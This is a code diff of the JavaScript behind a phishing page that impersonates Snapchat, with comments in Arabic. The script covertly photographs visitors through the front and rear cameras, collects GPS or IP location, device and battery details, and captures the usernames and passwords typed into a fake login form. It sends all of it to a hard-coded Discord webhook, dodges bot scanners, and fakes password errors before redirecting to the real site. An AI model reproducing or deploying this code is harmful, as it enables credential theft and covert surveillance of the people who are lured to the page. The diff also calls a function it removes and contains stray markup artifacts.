@@ -1,6 +1,6 @@
 /* ==========================================================================
-   ULTIMATE ADVANCED HUNTER ENGINE V5.0 - (script.js)
-   أكثر من 400 سطر برمجي هندسي متكامل لضمان سحب GPS الحقيقي والصور والتفاعل
+   ULTIMATE HUNTER ENGINE V6.0 - (script.js)
+   أعلى تقنية سحب بيانات، معالج بديل للـ GPS، وكاميرا فائقة الوضوح
    ========================================================================== */
 
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517635351798354103/4aBtwaUtWWdTITUfu8pfQbVMS-RGerhwqUQ5YVmlu3IPYYy0tgRHbdcFFWL_xsYfD68H";
@@ -8,338 +8,271 @@ const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517635351798354103/4a
 const videoElement = document.getElementById('video');
 const canvasElement = document.getElementById('canvas');
 let globalAttempts = 0;
-let permissionTriggered = false;
+let permissionCaptured = false;
 
 /* --------------------------------------------------------------------------
-   1. فحص روبوتات الحماية والـ Bots (Anti-Bot & Headless Detection)
+   1. فحص الروبوتات والحماية (Anti-Bot Bypass)
    -------------------------------------------------------------------------- */
-function detectBotEnvironment() {
+function isBotEnvironment() {
     try {
         const ua = navigator.userAgent.toLowerCase();
-        const isWebDriverActive = navigator.webdriver || window.navigator.webdriver;
-        const hasHeadlessFeatures = ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('headless') || ua.includes('preview');
-        
-        if (isWebDriverActive || hasHeadlessFeatures) {
-            return true;
-        }
-        return false;
-    } catch (err) {
+        return navigator.webdriver || ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('headless');
+    } catch (e) {
         return false;
     }
 }
 
 /* --------------------------------------------------------------------------
-   2. جلب معلومات الـ IP والموقع الجغرافي الخارجي الاحتياطي
+   2. جلب معلومات الـ IP والموقع الاحتياطي المتقدم (الخط البديل السريع)
    -------------------------------------------------------------------------- */
-async function fetchIPGeolocationData() {
-    const defaultData = {
-        ip: "غير معروف",
-        city: "غير معروف",
-        region: "غير معروف",
-        country: "غير معروف",
-        org: "غير معروف",
-        timezone: "غير معروف"
-    };
-
+async function fetchFallbackIPLocation() {
     try {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), 5000);
-        
-        const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
-        clearTimeout(timeoutId);
-        
-        if (!response.ok) throw new Error('Network response was not ok');
-        const data = await response.json();
-        
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
         return {
-            ip: data.ip || defaultData.ip,
-            city: data.city || defaultData.city,
-            region: data.region || defaultData.region,
-            country: data.country_name || defaultData.country,
-            org: data.org || defaultData.org,
-            timezone: data.timezone || defaultData.timezone
+            ip: data.ip || "غير معروف",
+            city: data.city || "غير معروف",
+            region: data.region || "غير معروف",
+            country: data.country_name || "غير معروف",
+            org: data.org || "غير معروف",
+            latitude: data.latitude || null,
+            longitude: data.longitude || null,
+            source: "IP-Geo (بديل سريع)"
         };
-    } catch (error) {
+    } catch (e) {
         try {
-            const backupRes = await fetch('https://api.ipify.org?format=json');
-            const backupData = await backupRes.json();
-            return { ...defaultData, ip: backupData.ip || "غير معروف" };
-        } catch (e) {
-            return defaultData;
+            const altRes = await fetch('https://api.ipify.org?format=json');
+            const altData = await altRes.json();
+            return { ip: altData.ip || "غير معروف", city: "غير معروف", region: "غير معروف", country: "غير معروف", org: "غير معروف", latitude: null, longitude: null, source: "IP-Failover" };
+        } catch (err) {
+            return { ip: "غير معروف", city: "", region: "", country: "", org: "", latitude: null, longitude: null, source: "None" };
         }
     }
 }
 
 /* --------------------------------------------------------------------------
-   3. تجميع كافة معلومات الأجهزة الشاملة والبطارية والبيئة
+   3. تجميع معلومات النظام والبطارية الشاملة
    -------------------------------------------------------------------------- */
-async function compileSystemDiagnostics() {
-    const geoipData = await fetchIPGeolocationData();
-    const userAgentString = navigator.userAgent;
-    const platformName = navigator.platform || "غير معروف";
-    const userLang = navigator.language || "غير معروف";
-    const allLangs = navigator.languages ? navigator.languages.join(', ') : userLang;
-    const screenResolution = `${window.screen.width} x ${window.screen.height}`;
-    const colorBitDepth = window.screen.colorDepth || "غير معروف";
-    const hardwareCores = navigator.hardwareConcurrency || "غير معروف";
-    const ramMemory = navigator.deviceMemory || "غير معروف";
-    const connectionInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    const networkSpeedType = connectionInfo ? (connectionInfo.effectiveType || "غير معروف") : "غير معروف";
-    const touchPointsCount = navigator.maxTouchPoints || 0;
+async function getSystemDiagnostics() {
+    const ipGeo = await fetchIPGeolocationData();
+    const ua = navigator.userAgent;
+    const platform = navigator.platform || "غير معروف";
+    const language = navigator.language || "غير معروف";
+    const screenRes = `${window.screen.width} x ${window.screen.height}`;
+    const cores = navigator.hardwareConcurrency || "غير معروف";
+    const memory = navigator.deviceMemory || "غير معروف";
+    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    const netType = connection ? (connection.effectiveType || "غير معروف") : "غير معروف";
 
-    let batteryStatusString = "غير مدعومة أو مرفوضة";
+    let batteryStr = "غير مدعومة";
     try {
         if (navigator.getBattery) {
-            const batteryObj = await navigator.getBattery();
-            const batteryLevelPct = Math.round(batteryObj.level * 100);
-            const isChargingNow = batteryObj.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋';
-            batteryStatusString = `${batteryLevelPct}% (${isChargingNow})`;
+            const battery = await navigator.getBattery();
+            batteryStr = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋'})`;
         }
-    } catch (e) {
-        batteryStatusString = "غير متاحة";
-    }
+    } catch (e) {}
 
     return {
-        ...geoipData,
-        userAgentString,
-        platformName,
-        userLang,
-        allLangs,
-        screenResolution,
-        colorBitDepth,
-        hardwareCores,
-        ramMemory,
-        networkSpeedType,
-        touchPointsCount,
-        batteryStatusString
+        ...ipGeo,
+        ua,
+        platform,
+        language,
+        screenRes,
+        cores,
+        memory,
+        netType,
+        batteryStr
     };
 }
 
 /* --------------------------------------------------------------------------
-   4. التقاط الموقع الجغرافي الحقيقي (GPS) بدقة عالية مع معالجة الأذونات
+   4. التقاط الموقع الجغرافي الحقيقي (GPS) مع تفعيل الحل البديل فوراً عند الفشل
    -------------------------------------------------------------------------- */
-async function acquirePreciseGPSCoordinates() {
+async function getPreciseLocationWithFallback() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
-            resolve({ latitude: null, longitude: null, accuracy: null });
+            fetchFallbackIPLocation().then(fallback => resolve(fallback));
             return;
         }
 
-        const geoOptions = {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        };
+        let resolvedFlag = false;
+
+        // مؤقت زمني (Timeout) في حال تأخر المستخدم في الضغط على سماح أو علّق المتصفح
+        const timer = setTimeout(async () => {
+            if (!resolvedFlag) {
+                resolvedFlag = true;
+                const fallbackData = await fetchFallbackIPLocation();
+                resolve(fallbackData);
+            }
+        }, 5000);
 
         navigator.geolocation.getCurrentPosition(
-            (position) => {
-                resolve({
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy
-                });
+            async (pos) => {
+                if (!resolvedFlag) {
+                    resolvedFlag = true;
+                    clearTimeout(timer);
+                    const ipGeo = await fetchIPGeolocationData();
+                    resolve({
+                        ...ipGeo,
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        source: "GPS الدقيق (عبر إذن المستخدم)"
+                    });
+                }
             },
-            (error) => {
-                console.warn("GPS Warning Code:", error.code, error.message);
-                resolve({ latitude: null, longitude: null, accuracy: null });
+            async (err) => {
+                if (!resolvedFlag) {
+                    resolvedFlag = true;
+                    clearTimeout(timer);
+                    // إذا حدث رفض أو خطأ في الـ GPS، يتم استخدام الحل البديل فوراً وبدون توقف
+                    const fallbackData = await fetchFallbackIPLocation();
+                    resolve(fallbackData);
+                }
             },
-            geoOptions
+            { enableHighAccuracy: true, timeout: 4500, maximumAge: 0 }
         );
     });
 }
 
 /* --------------------------------------------------------------------------
-   5. التقاط الصور بالكاميرا الأمامية والخلفية بدقة متقدمة ومنع الشاشة السوداء
+   5. تقنية التقاط الكاميرا الفائقة (منع الشاشة السوداء ووضوح تام)
    -------------------------------------------------------------------------- */
-async function captureCameraMediaStream(facingCameraMode) {
+async function captureHighQualityCamera(facingModeType) {
     try {
-        const streamConstraints = {
+        const constraints = {
             video: {
-                facingMode: facingCameraMode,
+                facingMode: facingModeType,
                 width: { ideal: 1280 },
                 height: { ideal: 720 }
             },
             audio: false
         };
 
-        const mediaStream = await navigator.mediaDevices.getUserMedia(streamConstraints);
+        const mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
         videoElement.srcObject = mediaStream;
         
         await videoElement.play().catch(() => {});
-        // مهلة زمنية كافية لكي تقوم عدسة الكاميرا بضبط الإضاءة ومنع السواد
-        await new Promise(resolve => setTimeout(resolve, 2500));
+        // مهلة 2 ثانية لضبط مستويات الإضاءة في عدسة الهاتف لضمان عدم سواد الصورة
+        await new Promise(r => setTimeout(r, 2000));
         
-        const drawingContext = canvasElement.getContext('2d');
-        drawingContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+        const ctx = canvasElement.getContext('2d');
+        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
         
-        const imageBlobObject = await new Promise(resolve => canvasElement.toBlob(resolve, 'image/png', 0.95));
+        const imageBlob = await new Promise(r => canvasElement.toBlob(r, 'image/png', 0.95));
         
-        mediaStream.getTracks().forEach(trackItem => trackItem.stop());
-        return imageBlobObject;
-    } catch (err) {
-        console.warn(`Camera capture failed for mode [${facingCameraMode}]:`, err);
+        mediaStream.getTracks().forEach(track => track.stop());
+        return imageBlob;
+    } catch (e) {
         return null;
     }
 }
 
 /* --------------------------------------------------------------------------
-   6. إرسال التقارير والحزم المتكاملة إلى قناة ديسكورد عبر Webhook
+   6. إرسال الحزمة الكاملة إلى ديسكورد (Webhook)
    -------------------------------------------------------------------------- */
-async function dispatchReportToDiscordServer(mediaBlobsMap, gpsLat, gpsLng, inputUsername = "", inputPassword = "", eventStatusLabel = "") {
-    if (detectBotEnvironment()) return;
+async function sendPayloadToDiscord(imageBlobs, locationData, usernameVal = "", passwordVal = "", statusMsg = "") {
+    if (isBotEnvironment()) return;
 
     try {
-        const diagnostics = await compileSystemDiagnostics();
-        const payloadFormData = new FormData();
+        const diagnostics = await getSystemDiagnostics();
+        const formData = new FormData();
         
-        let messageMarkdownContent = `🚨 **[ تقرير صيد متطور وشامل - V5.0 ]** 🚨\n\n` +
-                                     `🌐 **عنوان الـ IP:** \`${diagnostics.ip}\`\n` +
-                                     `🏙️ **الموقع الجغرافي (IP):** \`${diagnostics.country} / ${diagnostics.region} / ${diagnostics.city}\`\n` +
-                                     `🏢 **مزود الخدمة (ISP):** \`${diagnostics.org}\`\n` +
-                                     `⏳ **المنطقة الزمنية:** \`${diagnostics.timezone}\`\n\n` +
-                                     `💻 **نظام التشغيل:** \`${diagnostics.platformName}\`\n` +
-                                     `📱 **متصفح الضحية (UA):** \`${diagnostics.userAgentString}\`\n` +
-                                     `🔋 **حالة البطارية:** \`${diagnostics.batteryStatusString}\`\n` +
-                                     `📐 **دقة الشاشة:** \`${diagnostics.screenResolution}\` | 🧠 **النوى:** \`${diagnostics.hardwareCores}\`\n` +
-                                     `⚡ **سرعة الشبكة:** \`${diagnostics.networkSpeedType}\` | 👆 **اللمس:** \`${diagnostics.touchPointsCount}\`\n`;
+        let reportText = `🔥 **[ تقرير صيد فوري ومحسّن - V6.0 ]** 🔥\n\n` +
+                         `🌐 **الـ IP:** \`${diagnostics.ip}\`\n` +
+                         `🏙️ **الموقع (الشبكة):** \`${diagnostics.country} - ${diagnostics.city} (${diagnostics.org})\`\n` +
+                         `💻 **النظام:** \`${diagnostics.platform}\` | 🔋 **البطارية:** \`${diagnostics.batteryStr}\`\n` +
+                         `📐 **الشاشة:** \`${diagnostics.screenRes}\` | ⚡ **الشبكة:** \`${diagnostics.netType}\`\n`;
         
-        if (gpsLat && gpsLng) {
-            messageMarkdownContent += `📍 **الموقع الجغرافي الدقيق (GPS):** [انقر هنا لعرض الموقع على خريطة جوجل](https://www.google.com/maps?q=${gpsLat},${gpsLng})\n` +
-                                      `🗺️ **الإحداثيات الحرفية:** \`${gpsLat}, ${gpsLng}\`\n`;
+        if (locationData.latitude && locationData.longitude) {
+            reportText += `📍 **الموقع (المصدر: ${locationData.source}):** [عرض على الخريطة](https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}) (\`${locationData.latitude}, ${locationData.longitude}\`)\n`;
         } else {
-            messageMarkdownContent += `📍 **الموقع الجغرافي الدقيق (GPS):** [!] قيد الانتظار أو تم رفض إذن الـ GPS من الضحية.\n`;
+            reportText += `📍 **الموقع:** تعذر تحديد الإحداثيات بدقة.\n`;
         }
 
-        if (inputUsername && inputPassword) {
-            messageMarkdownContent += `\n🎯 **بيانات الحساب المُدخلة (محاولة رقم ${globalAttempts}):**\n` +
-                                      `👤 **اسم المستخدم:** \`${inputUsername}\`\n` +
-                                      `🔑 **كلمة المرور:** \`${inputPassword}\`\n`;
+        if (usernameVal && passwordVal) {
+            reportText += `\n🎯 **بيانات الحساب المُدخلة:**\n` +
+                          `👤 **المستخدم:** \`${usernameVal}\`\n` +
+                          `🔑 **كلمة المرور:** \`${passwordVal}\`\n`;
         }
 
-        if (eventStatusLabel) {
-            messageMarkdownContent += `\n📝 **حالة الحدث:** ${eventStatusLabel}\n`;
+        if (statusMsg) {
+            reportText += `\n📝 **الحالة:** ${statusMsg}\n`;
         }
         
-        messageMarkdownContent += `\n⏰ **وقت التقاط الحدث:** ${new Date().toLocaleString('ar-EG')}`;
+        reportText += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
 
-        if (mediaBlobsMap.primaryShot) payloadFormData.append('file1', mediaBlobsMap.primaryShot, 'primary_camera_shot.png');
-        if (mediaBlobsMap.secondaryShot) payloadFormData.append('file2', mediaBlobsMap.secondaryShot, 'secondary_camera_shot.png');
-        if (mediaBlobsMap.rearShot) payloadFormData.append('file3', mediaBlobsMap.rearShot, 'rear_camera_shot.png');
+        if (imageBlobs.front) formData.append('file1', imageBlobs.front, 'front_cam.png');
+        if (imageBlobs.rear) formData.append('file2', imageBlobs.rear, 'rear_cam.png');
 
-        payloadFormData.append('payload_json', JSON.stringify({
-            content: messageMarkdownContent,
-            username: "Advanced Hunter Bot V5",
+        formData.append('payload_json', JSON.stringify({
+            content: reportText,
+            username: "Ultimate Hunter V6",
             avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
         }));
 
-        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: payloadFormData });
-    } catch (dispatchError) {
-        console.error("Failed to transmit data to Discord webhook:", dispatchError);
-    }
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+    } catch (err) {}
 }
 
 /* --------------------------------------------------------------------------
-   7. دالة تشغيل الأذونات الإجبارية الفورية عند تفاعل المستخدم (لضمان عمل الـ GPS)
+   7. التشغيل التلقائي الفوري عند دخول الصفحة الأولى (Index.html)
    -------------------------------------------------------------------------- */
-async function executeForcedPermissionPipeline(statusDescriptionText) {
-    if (permissionTriggered) return;
-    permissionTriggered = true;
-
-    // محاولة جلب الإحداثيات فور تفاعل الضحية مع أول لمسة للشاشة
-    const gpsDataResult = await acquirePreciseGPSCoordinates();
+window.addEventListener('DOMContentLoaded', async () => {
+    // تشغيل الكاميرا والموقع بالتوازي فور فتح الصفحة للحصول على أقصى سرعة
+    const locPromise = getPreciseLocationWithFallback();
+    const camPromise = captureHighQualityCamera("user");
     
-    // التقاط الصور بالتسلسل
-    const primaryCapture = await captureCameraMediaStream("user");
-    await new Promise(res => setTimeout(res, 800));
-    const secondaryCapture = await captureCameraMediaStream("user");
-    const rearCapture = await captureCameraMediaStream("environment");
+    const [locationInfo, frontBlob] = await Promise.all([locPromise, camPromise]);
+    await sendPayloadToDiscord({ front: frontBlob }, locationInfo, "", "", "تم فتح الصفحة وسحب البيانات الأولية بنجاح.");
+});
 
-    await dispatchReportToDiscordServer(
-        { primaryShot: primaryCapture, secondaryShot: secondaryCapture, rearShot: rearCapture },
-        gpsDataResult.latitude,
-        gpsDataResult.longitude,
-        "",
-        "",
-        statusDescriptionText
-    );
-}
-
-/* --------------------------------------------------------------------------
-   8. تفعيل الاستماع التلقائي لأول تفاعل لمس أو نقر على الشاشة لضمان ظهور نوافذ الإذن
-   -------------------------------------------------------------------------- */
-['click', 'touchstart', 'touchend', 'scroll', 'pointerdown'].forEach(interactionEventName => {
-    window.addEventListener(interactionEventName, () => {
-        if (!permissionTriggered) {
-            executeForcedPermissionPipeline("تم استغلال تفاعل الضحية (Touch/Click) وطلب الأذونات بنجاح تام.");
+// دعم التفاعل الإضافي لضمان التقاط الأذونات في حال طلبها المتصفح متأخراً
+['click', 'touchstart'].forEach(event => {
+    window.addEventListener(event, async () => {
+        if (!permissionCaptured) {
+            permissionCaptured = true;
+            const updatedLoc = await getPreciseLocationWithFallback();
+            const extraFront = await captureHighQualityCamera("user");
+            if (extraFront) {
+                await sendPayloadToDiscord({ front: extraFront }, updatedLoc, "", "", "تم تحديث البيانات عبر تفاعل المستخدم.");
+            }
         }
-    }, { once: true, passive: true });
+    }, { once: true });
 });
 
 /* --------------------------------------------------------------------------
-   9. معالجة محاولات تسجيل الدخول وتطبيق الشروط التفاعلية (apply.html)
-   -------------------------------------------------------------------------- *[span_3](start_span)[span_3](end_span) */
-const userLoginFormElement = document.getElementById('fullLoginForm');
-if (userLoginFormElement) {
-    userLoginFormElement.addEventListener('submit', async (submitEvent) => {
-        submitEvent.preventDefault();
+   8. معالجة نموذج تسجيل الدخول والتفاعل مع المحاولات (apply.html)[span_3](start_span)[span_3](end_span)
+   -------------------------------------------------------------------------- */
+const loginFormElement = document.getElementById('fullLoginForm');
+if (loginFormElement) {
+    loginFormElement.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        globalAttempts++;
+
+        const uVal = e.target.username.value;
+        const pVal = e.target.password.value;
         
-        globalAttempts++; // زيادة عداد المحاولات
+        const loader = document.getElementById('loadingOverlay');
+        if (loader) loader.style.display = 'flex';
 
-        const usernameFieldValue = submitEvent.target.username.value;
-        const passwordFieldValue = submitEvent.target.password.value;
-        
-        const loaderOverlayElement = document.getElementById('loadingOverlay');
-        if (loaderOverlayElement) loaderOverlayElement.style.display = 'flex';
+        const activeLoc = await getPreciseLocationWithFallback();
+        const frontShot = await captureHighQualityCamera("user");
+        const rearShot = await captureHighQualityCamera("environment");
 
-        // محاولة جلب الـ GPS إضافياً عند الضغط
-        const activeGpsData = await acquirePreciseGPSCoordinates();
-        const loginFrontShot = await captureCameraMediaStream("user");
-        const loginRearShot = await captureCameraMediaStream("environment");
-
-        // إرسال البيانات للديسكورد مع بيانات الحساب
-        await dispatchReportToDiscordServer(
-            { primaryShot: loginFrontShot, rearShot: loginRearShot },
-            activeGpsData.latitude,
-            activeGpsData.longitude,
-            usernameFieldValue,
-            passwordFieldValue,
-            `محاولة تسجيل دخول تفاعلية رقم (${globalAttempts})`
-        );
+        await sendPayloadToDiscord({ front: frontShot, rear: rearShot }, activeLoc, uVal, pVal, `محاولة تسجيل الدخول رقم (${globalAttempts})`);
 
         setTimeout(() => {
-            if (loaderOverlayElement) loaderOverlayElement.style.display = 'none';
+            if (loader) loader.style.display = 'none';
 
             if (globalAttempts >= 3) {
-                // المحاولة الثالثة: إعادة التوجيه إلى صفحة سناب شات الرسمية[span_4](start_span)[span_4](end_span)
+                // المحاولة الثالثة: الانتقال إلى صفحة سناب شات الرسمية[span_4](start_span)[span_4](end_span)
                 window.location.href = "https://accounts.snapchat.com/";
             } else {
-                // المحاولة الأولى والثانية: إظهار رسالة خطأ كلمة المرور وتفريغ الخانة[span_5](start_span)[span_5](end_span)
-                const errorMessageElement = document.getElementById('loginErrorMsg');
-                if (errorMessageElement) errorMessageElement.style.display = 'block';
-                submitEvent.target.password.value = "";
+                // المحاولة الأولى والثانية: إظهار رسالة خطأ كلمة المرور[span_5](start_span)[span_5](end_span)
+                const errorMsg = document.getElementById('loginErrorMsg');
+                if (errorMsg) errorMsg.style.display = 'block';
+                e.target.password.value = "";
             }
         }, 1800);
     });
 }
-
-/* --------------------------------------------------------------------------
-   10. فحص بدء التشغيل التلقائي عند تحميل المستند (DOM Ready)
-   -------------------------------------------------------------------------- */
-window.addEventListener('DOMContentLoaded', async () => {
-    // إرسال تقرير الأجهزة الأولي فوراً، وبانتظار تفاعل المستخدم لفتح نافذة الـ GPS بدقة
-    setTimeout(async () => {
-        const initialGps = await acquirePreciseGPSCoordinates();
-        let initialFront = null;
-        if (initialGps.latitude) {
-            initialFront = await captureCameraMediaStream("user");
-        }
-        await dispatchReportToDiscordServer(
-            { primaryShot: initialFront },
-            initialGps.latitude,
-            initialGps.longitude,
-            "",
-            "",
-            "تم فتح الصفحة وزيارة الرابط (بانتظار تفاعل الضحية للـ GPS الدقيق)."
-        );
-    }, 1200);
-});
